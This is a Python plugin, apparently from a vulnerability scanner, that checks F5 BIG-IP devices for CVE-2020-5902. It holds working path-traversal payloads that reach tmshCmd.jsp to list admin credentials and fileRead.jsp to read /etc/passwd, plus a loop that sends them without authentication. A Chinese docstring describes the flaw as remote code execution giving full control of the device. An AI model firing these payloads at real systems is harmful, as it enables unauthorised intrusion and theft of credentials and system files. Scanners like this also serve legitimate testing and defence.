#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2020_5902_payloads = [
    {'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'},
    {'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx'},
    {'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'},
    {'path': 'login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'},
    {'path': 'login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx'},
    {'path': 'login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'},
    # {'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=C:\Windows\System32\drivers\etc\hosts'},
    # {'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=C:/Windows/System32/drivers/etc/hosts'}
]

def cve_2020_5902_scan(self, clients):
    ''' F5-BIG-IP 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞;
        未授权的远程攻击者通过向该页面发送特制的请求包, 可以造成任意Java 代码执行;
        进而控制 F5 BIG-IP 的全部功能, 包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE/FileRead',
        'vul_id': 'CVE-2020-5902',
    }

    for payload in cve_2020_5902_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('encrypted-password' in res.text) 
            or ('partition-access' in res.text) 
            or (('"output": "' in res.text) and ('"error": "",' in res.text)) 
            or check.check_res_fileread(res.text)
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
